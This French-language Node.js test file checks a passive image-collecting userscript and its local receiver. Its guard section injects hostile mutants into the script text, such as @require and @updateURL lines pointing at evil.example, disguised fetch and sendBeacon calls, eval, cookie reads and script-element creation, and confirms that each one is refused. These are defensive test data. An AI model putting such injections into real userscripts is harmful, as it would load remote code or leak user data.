// node test-userscript-collectorviper.js — le userscript PASSIF de Collectorviper (userscript-collectorviper.js).
//  · STATIQUE : la garde (collecte-cartes/garde-userscript-passif.js) est écrite par ce qu'elle AUTORISE — liste fermée de directives d'en-tête, chaînes sans hôte ni URL hors
//    127.0.0.1, écritures / méthodes / `new` / createElement d'ensembles fermés — et on la fait dire NON sur des mutants du texte, en mémoire.
//  · COMPORTEMENT : dans un bac `vm` sur un DOM FABRIQUÉ, aucune requête réelle.
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const R = require('./recepteur-collectorviper');
const G = require('./collecte-cartes/garde-userscript-passif');
const { LARGEUR_MIN } = require('./collecte-cartes/seuils-images');

let ok = 0, ko = 0;
const verifier = (nom, obtenu, attendu) => {
    const a = JSON.stringify(obtenu), b = JSON.stringify(attendu);
    if (a === b) { ok++; console.log(`✅ ${nom}`); } else { ko++; console.log(`❌ ${nom}\n   obtenu  ${a}\n   attendu ${b}`); }
};

const SRC = fs.readFileSync(process.env.CV_USERSCRIPT ? path.resolve(process.env.CV_USERSCRIPT) : path.join(__dirname, 'userscript-collectorviper.js'), 'utf8');
const m = /^\/\/ ==UserScript==\r?\n([\s\S]*?)\r?\n\/\/ ==\/UserScript==/.exec(SRC);
verifier('l\'en-tête ==UserScript== existe', !!m, true);
const entete = m ? m[1] : '';
const code = SRC.slice(m ? m[0].length : 0);
const sansCommentaires = code.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:\\'"`])\/\/[^\n]*/g, '$1');

// ── STATIQUE : le texte livré est TOUT dans l'ensemble admis
verifier('GARDE : le userscript livré n\'a aucune violation', G.violations(SRC), []);
verifier('@match : la page supposée de Collectorviper, rien d\'autre', G.MATCH, 'https://collectorviper.livejournal.com/*');
verifier('l\'en-tête dit que le @match est une SUPPOSITION (aucune requête ne l\'a vérifié)', /SUPPOSITION/.test(SRC.slice(0, 3500)), true);
const PORT_US = /^\s*var PORT = (\d{4,5});/m.exec(code);
verifier('PORT : constante unique, égale au port par défaut du récepteur', [!!PORT_US, Number(PORT_US?.[1]) === R.PORT_DEFAUT], [true, true]);
const ENTETE_US = /'X-Rat-Market':\s*'([^']+)'/.exec(code);
verifier('l\'en-tête fixe du script est celui que le récepteur exige', [R.ENTETE_MARQUE, ENTETE_US?.[1]], ['x-rat-market', R.VALEUR_MARQUE]);
const num = nom => { const r = new RegExp(`var ${nom} = ([^;]+);`).exec(code); return r ? Function(`return (${r[1]})`)() : null; };
verifier('SEUIL_LARGEUR : le seuil du dépôt (collecte-cartes/seuils-images.js), pas un autre nombre', num('SEUIL_LARGEUR'), LARGEUR_MIN);
verifier('IMAGES_MAX du script ≤ celui du récepteur', num('IMAGES_MAX') > 0 && num('IMAGES_MAX') <= R.IMAGES_MAX, true);
verifier('IMAGE_OCTETS_MAX du script ≤ celui du récepteur', num('IMAGE_OCTETS_MAX') > 0 && num('IMAGE_OCTETS_MAX') <= R.IMAGE_OCTETS_MAX, true);
verifier('redirections refusées sur le POST local', /redirect: 'error'/.test(sansCommentaires), true);
verifier('la seule lecture d\'octets : le canvas des pixels AFFICHÉS (drawImage + toDataURL, chacun une fois)', [(sansCommentaires.match(/\.drawImage\s*\(/g) || []).length, (sansCommentaires.match(/\.toDataURL\s*\(/g) || []).length], [1, 1]);
verifier('le panneau se construit par l\'API DOM : aucun innerHTML ni insertAdjacentHTML', /innerHTML|insertAdjacentHTML/.test(sansCommentaires), false);
verifier('un seul addEventListener (le clic)', (sansCommentaires.match(/addEventListener\s*\(/g) || []).length, 1);

// la garde sait dire NON : chaque mutant du texte est refusé (en mémoire, rien d'écrit)
const apresPort = charge => SRC.replace('var PORT = 8767;', 'var PORT = 8767;\n' + charge);
const dansEntete = ligne => SRC.replace('// @noframes', '// @noframes\n' + ligne);
const mutants = [
    ['en-tête : @require externe', dansEntete('// @require      https://evil.example/x.js')],
    ['en-tête : @require sans schéma', dansEntete('// @require      //evil.example/x.js')],
    ['en-tête : @resource', dansEntete('// @resource     css https://evil.example/a.css')],
    ['en-tête : @icon', dansEntete('// @icon         https://evil.example/i.png')],
    ['en-tête : @updateURL', dansEntete('// @updateURL    https://evil.example/u.js')],
    ['en-tête : @downloadURL', dansEntete('// @downloadURL  https://evil.example/d.js')],
    ['en-tête : directive inconnue (@unwrap)', dansEntete('// @unwrap')],
    ['en-tête : second @connect', dansEntete('// @connect      evil.example')],
    ['en-tête : @connect *', SRC.replace('// @connect      127.0.0.1', '// @connect      *')],
    ['en-tête : second @match', dansEntete('// @match        https://evil.example/*')],
    ['en-tête : @grant GM_download', SRC.replace('// @grant        GM_xmlhttpRequest', '// @grant        GM_xmlhttpRequest\n// @grant        GM_download')],
    ['en-tête : ligne qui n\'est pas une directive', dansEntete('// https://evil.example/ordre')],
    ['corps : <img src="//hôte"> dans un innerHTML', apresPort('document.body.innerHTML = \'<img src="//evil.example/p.png">\';')],
    ['corps : <link href="//hôte">', apresPort('var l = \'<link rel="stylesheet" href="//evil.example/a.css">\';')],
    ['corps : src sans schéma ni double barre (evil.example/p.png)', apresPort('var l = \'x src="evil.example/p.png"\';')],
    ['corps : url(//hôte) dans du CSS', apresPort('var c = \'background:url(//evil.example/a.png)\';')],
    ['corps : url() dans du CSS avec un hôte entre guillemets', apresPort('var c = \'background:url("evil.example/a.png")\';')],
    ['corps : propriété CSS hors liste (behavior)', apresPort('var c = \'behavior:red;\';')],
    ['corps : adresse https écrite', apresPort('var u = \'https://evil.example/x\';')],
    ['corps : adresse sans schéma, chemin', apresPort('var u = \'evil.example/x\';')],
    ['corps : gabarit de chaîne', apresPort('var u = `//evil.example/${PORT}`;')],
    ['corps : fetch', apresPort('var f = fetch(\'http://127.0.0.1:1/\');')],
    ['corps : XMLHttpRequest', apresPort('var x = new XMLHttpRequest();')],
    ['corps : new Audio', apresPort('var a = new Audio(\'x\');')],
    ['corps : new Worker', apresPort('var a = new Worker(\'x\');')],
    ['corps : new Image', apresPort('var a = new Image();')],
    ['corps : navigator[\'send\'+\'Beacon\']', apresPort('var b = navigator[\'send\' + \'Beacon\'];')],
    ['corps : sendBeacon', apresPort('document.sendBeacon(\'x\');')],
    ['corps : window[\'fe\'+\'tch\']', apresPort('var w = window[\'fe\' + \'tch\'];')],
    ['corps : accès indexé calculé sur document', apresPort('var d = document[PORT + 1];')],
    ['corps : GM.xmlHttpRequest', apresPort('GM.xmlHttpRequest({});')],
    ['corps : un second GM_xmlhttpRequest', apresPort('GM_xmlhttpRequest({});')],
    ['corps : GM_download', apresPort('GM_download(\'x\');')],
    ['corps : img[\'src\'] = …', apresPort('document[\'q\'] = 1; var i = document.createElement(\'canvas\'); i[\'src\'] = \'x\';')],
    ['corps : img.src = …', apresPort('var i = document.createElement(\'canvas\'); i.src = PORT;')],
    ['corps : .href = …', apresPort('var i = document.createElement(\'canvas\'); i.href = PORT;')],
    ['corps : crossOrigin', apresPort('var i = document.createElement(\'canvas\'); i.crossOrigin = PORT;')],
    ['corps : innerHTML', apresPort('var i = document.createElement(\'div\'); i.innerHTML = PORT;')],
    ['corps : setAttribute', apresPort('var i = document.createElement(\'div\'); i.setAttribute(PORT, PORT);')],
    ['corps : createElement(\'img\')', apresPort('var i = document.createElement(\'img\');')],
    ['corps : createElement(\'script\')', apresPort('var i = document.createElement(\'script\');')],
    ['corps : createElement(variable)', apresPort('var i = document.createElement(PORT);')],
    ['corps : location = …', apresPort('location = PORT;')],
    ['corps : location.href = …', apresPort('location.href = PORT;')],
    ['corps : window.open', apresPort('window.open(PORT);')],
    ['corps : eval', apresPort('eval(PORT);')],
    ['corps : setTimeout', apresPort('setTimeout(function () {}, 1);')],
    ['corps : document.cookie', apresPort('var c = document.cookie;')],
    ['corps : .click()', apresPort('document.createElement(\'div\').click();')],
    ['corps : fonction non déclarée appelée par un nom nu', apresPort('quelqueChose(PORT);')],
    ['corps : méthode hors liste (.postMessage)', apresPort('document.postMessage(PORT);')]
];
for (const [nom, texteMute] of mutants) {
    const v = G.violations(texteMute);
    verifier(`la garde REFUSE : ${nom}`, v.length > 0, true);
}
verifier('contrôle du banc : un texte sans mutation reste admis (la garde ne refuse pas tout)', G.violations(apresPort('')), []);
verifier('contrôle du banc : une ligne d\'en-tête admise répétée est refusée (chaque clé une fois)', G.violations(dansEntete('// @version      1.0')).length > 0, true);

// ── COMPORTEMENT, dans un bac vm, sur un DOM fabriqué
const SIG = Buffer.from('89504e470d0a1a0a', 'hex');
const b64 = (n = 1) => Buffer.concat([SIG, Buffer.alloc(30, n)]).toString('base64');
const el = (o = {}) => ({
    textContent: '', style: {}, children: [], ecouteurs: {}, tagName: 'DIV', parentElement: null, previousElementSibling: null,
    addEventListener(t, f) { this.ecouteurs[t] = f; }, appendChild(c) { this.children.push(c); return c; },
    ...o
});
// une image de la page : lisible, protégée (canvas contaminé), petite, ou pas chargée
const image = (n, { w = 500, h = 700, complete = true, tainted = false, src = `https://cdn-exemple.test/scans/${n}.jpg`, alt = `Carte ${n}`, title = '', parent = null, prev = null } = {}) =>
    ({ _n: n, tagName: 'IMG', naturalWidth: complete ? w : 0, naturalHeight: complete ? h : 0, complete, currentSrc: src, src, alt, title, tainted, parentElement: parent, previousElementSibling: prev, closest(s) { return this._closest && this._closest[s] || null; }, textContent: '' });

function fabriquerMonde({ images = [image(1)], reponses = null, erreur = null, hostname = 'collectorviper.livejournal.com', titre = 'Master Collection Scans Catalogue' } = {}) {
    const appels = [], acces = { cookie: 0, canvasCrees: 0, dessinees: [] };
    const doc = el({ title: titre, body: el() });
    Object.defineProperty(doc, 'cookie', { get() { acces.cookie++; return 'secret=1'; } });
    doc.querySelectorAll = s => (s === 'img' ? images : []);
    doc.querySelector = () => null;
    const elements = [];
    doc.createElement = tag => {
        if (tag === 'canvas') {
            acces.canvasCrees++;
            const c = el({ tag, width: 0, height: 0 });
            c.getContext = () => ({ drawImage(img) { c._img = img; acces.dessinees.push(img._n); } });
            c.toDataURL = () => { if (c._img.tainted) { const e = new Error('The canvas has been tainted by cross-origin data.'); e.name = 'SecurityError'; throw e; } return 'data:image/png;base64,' + b64(c._img._n); };
            return c;
        }
        const e = el({ tag }); elements.push(e); return e;
    };
    doc.body.appendChild = c => c;
    const location = { href: `https://${hostname}/339.html`, origin: `https://${hostname}`, hostname, pathname: '/339.html', search: '', hash: '' };
    const GM_xmlhttpRequest = o => {
        appels.push(o);
        const corps = JSON.parse(o.data);
        setTimeout(() => {
            if (erreur) return o.onerror?.({ error: erreur });
            const r = reponses ? reponses(corps, appels.length) : null;
            if (r) return o.onload?.(r);
            if (corps.type === 'image') return o.onload?.({ status: 200, responseText: JSON.stringify({ ok: true, fichier: 'img-0001.png' }) });
            const c = { vues: corps.images.length, lues: corps.images.filter(e => e.etat === 'lue').length, illisibles: corps.images.filter(e => e.etat === 'illisible').length, sousSeuil: corps.images.filter(e => e.etat === 'sous-seuil').length, manquantes: 0 };
            return o.onload?.({ status: 200, responseText: JSON.stringify({ ok: true, dossier: 'x', comptes: c, etat: 'complet' }) });
        }, 0);
    };
    const bac = { document: doc, location, GM_xmlhttpRequest, window: { location, document: doc }, console, JSON, Date, String, Number, Math, Array, Object, URL, RegExp, Promise, Error };
    bac.window.window = bac.window;
    return { bac, appels, acces, elements, doc };
}
const attendre = ms => new Promise(r => setTimeout(r, ms));
const lancer = w => vm.runInNewContext(SRC, w.bac, { filename: 'userscript-collectorviper.js' });
const texte = w => w.elements.map(e => e.textContent).join(' | ');
const bouton = w => w.elements.find(e => e.tag === 'button' && e.ecouteurs.click) || null;
const cliquer = async w => { bouton(w).ecouteurs.click({}); await attendre(80); };
const corps = w => w.appels.map(a => JSON.parse(a.data));

(async () => {
    // chargement : rien ne part, rien ne se lit
    let w = fabriquerMonde();
    lancer(w);
    verifier('au chargement : un bouton, AUCUNE requête, AUCUN canvas créé, aucune image dessinée', [!!bouton(w), w.appels.length, w.acces.canvasCrees, w.acces.dessinees.length], [true, 0, 0, 0]);
    verifier('le panneau est fait d\'éléments div et button seulement', [...new Set(w.elements.map(e => e.tag))].sort(), ['button', 'div']);
    await attendre(40);
    verifier('… toujours rien après attente', [w.appels.length, w.acces.canvasCrees], [0, 0]);

    // un clic sur une page de quatre images : lisible, protégée, petite, non chargée
    const entetePage = el({ tagName: 'H2', textContent: ' Neo Genesis \n' });
    const figure = el({ tagName: 'FIGURE', parentElement: el({ tagName: 'DIV', previousElementSibling: entetePage }) });
    const legende = el({ tagName: 'FIGCAPTION', textContent: '  Carte 1 — Pichu \n 1/111 ' });
    const A = image(1, { parent: figure }); A._closest = { figure: Object.assign(figure, { querySelector: s => (s === 'figcaption' ? legende : null) }) };
    const Bi = image(2, { w: 600, h: 800, tainted: true, title: 'carte 2' });
    const C = image(3, { w: LARGEUR_MIN - 1, h: 300 });
    const D = image(4, { complete: false });
    w = fabriquerMonde({ images: [A, Bi, C, D] });
    lancer(w); await cliquer(w);
    const msgs = corps(w);
    verifier('au clic : UNE image lue + UNE clôture de page, rien d\'autre (2 requêtes, toutes POST vers http://127.0.0.1:<port>/releve)', [w.appels.length, w.appels.map(a => a.method), w.appels.every(a => /^http:\/\/127\.0\.0\.1:\d{4,5}\/releve$/.test(a.url)), msgs.map(x => x.type)], [2, ['POST', 'POST'], true, ['image', 'page']]);
    verifier('seules les images à lire sont DESSINÉES (la lisible et la protégée) ; la petite et la non chargée ne le sont jamais', w.acces.dessinees, [1, 2]);
    verifier('l\'image lue part avec ses octets PNG, son indice, le paquet et l\'adresse de la page', [msgs[0].indice, msgs[0].mime, msgs[0].donnees === b64(1), msgs[0].url, /^\d{8}T\d{6}Z-[a-f0-9]{8}$/.test(msgs[0].paquet)], [1, 'image/png', true, 'https://collectorviper.livejournal.com/339.html', true]);
    verifier('image et page portent le MÊME paquet', msgs[0].paquet === msgs[1].paquet, true);
    verifier('l\'image protégée est relevée « illisible sans requête » : adresse, dimensions, alt/title gardés, AUCUN octet', [msgs[1].images[1].etat, msgs[1].images[1].raison, msgs[1].images[1].src, msgs[1].images[1].w, msgs[1].images[1].h, msgs[1].images[1].title], ['illisible', 'illisible sans requête', 'https://cdn-exemple.test/scans/2.jpg', 600, 800, 'carte 2']);
    verifier('l\'image sous le seuil est relevée « sous-seuil », sans octets', [msgs[1].images[2].etat, msgs[1].images[2].raison, msgs[1].images[2].w], ['sous-seuil', 'sous le seuil', LARGEUR_MIN - 1]);
    verifier('l\'image non chargée est relevée illisible (rien n\'est forcé), w = 0', [msgs[1].images[3].etat, /non chargée/.test(msgs[1].images[3].raison), msgs[1].images[3].w], ['illisible', true, 0]);
    verifier('la légende (figcaption, espaces normalisés) et l\'intertitre (titre précédent) sont relevés', [msgs[1].images[0].legende, msgs[1].images[0].intertitre, msgs[1].images[0].alt], ['Carte 1 — Pichu 1/111', 'Neo Genesis', 'Carte 1']);
    verifier('page : titre de la page, indices 1..4 dans l\'ordre du document', [msgs[1].titre, msgs[1].images.map(e => e.indice)], ['Master Collection Scans Catalogue', [1, 2, 3, 4]]);
    verifier('les messages passent la validation du récepteur (image et page)', [R.jugerMessage(JSON.stringify(msgs[0])).statut, R.jugerMessage(JSON.stringify(msgs[1])).statut], [200, 200]);
    verifier('en-têtes : Content-Type JSON et l\'en-tête fixe, rien d\'autre ; requête anonyme', [Object.keys(w.appels[0].headers || {}).sort(), w.appels[0].headers['X-Rat-Market'], w.appels[0].anonymous === true], [['Content-Type', 'X-Rat-Market'], R.VALEUR_MARQUE, true]);
    verifier('aucun accès aux cookies', w.acces.cookie, 0);
    verifier('le panneau dit les quatre comptes : 4 images, 1 lue, 2 illisibles, 1 sous le seuil', [/4 images/.test(texte(w)), /1 lue/.test(texte(w)), /2 illisibles/.test(texte(w)), /1 sous le seuil/.test(texte(w))], [true, true, true, true]);
    verifier('le panneau dit pourquoi les illisibles le sont (aucune requête n\'a été faite pour les lire)', /sans requête/.test(texte(w)), true);

    // un seul clic = un seul paquet ; un second clic = un nouveau paquet
    const p1 = msgs[0].paquet;
    await new Promise(r => setTimeout(r, 1100));
    await cliquer(w);
    const apres = corps(w);
    verifier('un second clic ouvre un NOUVEAU paquet (aucune image n\'est réécrite dans l\'ancien)', apres.length === 4 && apres[2].paquet !== p1 && apres[2].paquet === apres[3].paquet, true);

    // récepteur qui refuse l'image : relevée illisible avec le motif, jamais comptée lue
    w = fabriquerMonde({ images: [image(1)], reponses: (c) => (c.type === 'image' ? { status: 415, responseText: JSON.stringify({ ok: false, motif: 'signature PNG absente (test)' }) } : null) });
    lancer(w); await cliquer(w);
    const refus = corps(w);
    verifier('image refusée par le récepteur : l\'entrée devient « illisible », motif gardé, la page est quand même clôturée', [refus.length, refus[1]?.images[0].etat, /signature PNG absente \(test\)/.test(refus[1]?.images[0].raison || '')], [2, 'illisible', true]);

    // récepteur éteint : arrêt net, un message qui dit de le lancer, UNE seule tentative
    w = fabriquerMonde({ erreur: 'connexion refusée' });
    lancer(w); await cliquer(w);
    verifier('récepteur injoignable : une seule tentative, un message qui dit de lancer le récepteur', [w.appels.length, /récepteur/i.test(texte(w)), /node recepteur-collectorviper\.js/.test(texte(w))], [1, true, true]);

    // mauvaise page : rien n'est envoyé ni lu
    w = fabriquerMonde({ hostname: 'exemple.livejournal.com' });
    lancer(w); await cliquer(w);
    verifier('hors de la page attendue : rien n\'est envoyé, aucun canvas', [w.appels.length, w.acces.canvasCrees], [0, 0]);

    // trop d'images : le surplus est dit, jamais relevé en silence
    const beaucoup = Array.from({ length: 305 }, (_, i) => image(i + 1, { w: 50, h: 50 }));
    w = fabriquerMonde({ images: beaucoup });
    lancer(w); await cliquer(w);
    const gros = corps(w);
    verifier('305 images : 300 relevées, le surplus (5) est DIT à l\'écran', [gros.length, gros[0]?.images.length, /5 image\(s\) au-delà/.test(texte(w))], [1, 300, true]);
    // aucune image
    w = fabriquerMonde({ images: [] });
    lancer(w); await cliquer(w);
    verifier('aucune image sur la page : rien n\'est envoyé, le panneau le dit', [w.appels.length, /aucune image/i.test(texte(w))], [0, true]);

    console.log(`\n${ok} réussis, ${ko} en échec`);
    process.exit(ko ? 1 : 0);
})();
